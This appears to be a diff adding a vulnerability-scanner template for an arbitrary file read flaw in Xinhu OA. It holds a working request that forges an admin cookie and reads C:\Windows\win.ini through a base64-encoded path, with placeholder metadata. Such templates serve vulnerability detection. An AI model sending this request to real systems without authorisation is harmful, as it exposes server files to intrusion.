@@ -1,0 +1,25 @@
+id: xinhuOA-aqqzwzc-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 信呼OA任意文件读取漏洞
+  reference:
+    - http://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/aqqzwzc/?m=sysfile&d=system&a=edit&path=QzpcXFdpbmRvd3NcXHdpbi5pbmk"
+    headers:
+      Cookie: username=admin     
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - 'app support'
